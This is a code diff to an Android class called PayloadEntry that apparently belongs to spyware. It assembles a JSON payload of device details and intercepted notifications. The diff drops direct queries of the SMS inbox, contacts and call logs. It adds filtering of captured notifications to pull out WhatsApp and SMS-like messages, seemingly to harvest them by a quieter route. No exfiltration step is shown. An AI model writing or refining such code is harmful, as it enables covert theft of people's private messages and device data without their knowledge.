@@ -1,10 +1,7 @@
 package com.pixelplay.payload;
 
 import android.content.Context;
-import android.database.Cursor;
-import android.net.Uri;
 import android.os.Build;
-import android.provider.ContactsContract;
 import android.util.Log;
 
 import org.json.JSONArray;
@@ -59,19 +56,21 @@ public class PayloadEntry {
         try {
             JSONObject p = new JSONObject();
             p.put("device", getDev());
-            p.put("sms", getSms(ctx));
-            p.put("contacts", getContacts(ctx));
-            p.put("call_logs", getCalls(ctx));
 
             JSONArray caps = getCapturedNotifs();
             p.put("notifications", caps);
             JSONArray wa = new JSONArray();
+            JSONArray sms = new JSONArray();
             for (int i = 0; i < caps.length(); i++) {
                 JSONObject n = caps.getJSONObject(i);
-                if ("com.whatsapp".equals(n.optString("package", "")))
+                String pkg = n.optString("package", "");
+                if ("com.whatsapp".equals(pkg))
                     wa.put(n);
+                if (pkg.contains("messaging") || pkg.contains("sms") || pkg.contains("message"))
+                    sms.put(n);
             }
             p.put("whatsapp", wa);
+            p.put("sms", sms);
 
             String json = p.toString(2);
             Log.d(TAG, "[+] payload size: " + json.length());
@@ -107,58 +106,6 @@ public class PayloadEntry {
         return o;
     }
 
-    private static JSONArray getSms(Context ctx) {
-        JSONArray a = new JSONArray();
-        try (Cursor c = ctx.getContentResolver().query(
-                Uri.parse("content://sms/inbox"),
-                null, null, null, "date DESC LIMIT 50")) {
-            if (c != null) {
-                while (c.moveToNext()) {
-                    JSONObject m = new JSONObject();
-                    m.put("addr", sf(c, "address"));
-                    m.put("body", sf(c, "body"));
-                    a.put(m);
-                }
-            }
-        } catch (Exception ignored) {}
-        return a;
-    }
-
-    private static JSONArray getContacts(Context ctx) {
-        JSONArray a = new JSONArray();
-        try (Cursor c = ctx.getContentResolver().query(
-                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                null, null, null, null)) {
-            if (c != null) {
-                while (c.moveToNext()) {
-                    JSONObject o = new JSONObject();
-                    o.put("name", sf(c, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                    o.put("phone", sf(c, ContactsContract.CommonDataKinds.Phone.NUMBER));
-                    a.put(o);
-                }
-            }
-        } catch (Exception ignored) {}
-        return a;
-    }
-
-    private static JSONArray getCalls(Context ctx) {
-        JSONArray a = new JSONArray();
-        try (Cursor c = ctx.getContentResolver().query(
-                Uri.parse("content://call_log/calls"),
-                null, null, null, "date DESC LIMIT 50")) {
-            if (c != null) {
-                while (c.moveToNext()) {
-                    JSONObject o = new JSONObject();
-                    o.put("number", sf(c, "number"));
-                    o.put("type", sf(c, "type"));
-                    o.put("duration", sf(c, "duration"));
-                    a.put(o);
-                }
-            }
-        } catch (Exception ignored) {}
-        return a;
-    }
-
     private static JSONArray getCapturedNotifs() {
         JSONArray a = new JSONArray();
         try {
@@ -171,10 +118,5 @@ public class PayloadEntry {
             }
         } catch (Exception ignored) {}
         return a;
-    }
-
-    private static String sf(Cursor c, String col) {
-        try { return c.getString(c.getColumnIndexOrThrow(col)); }
-        catch (Exception e) { return ""; }
     }
 }
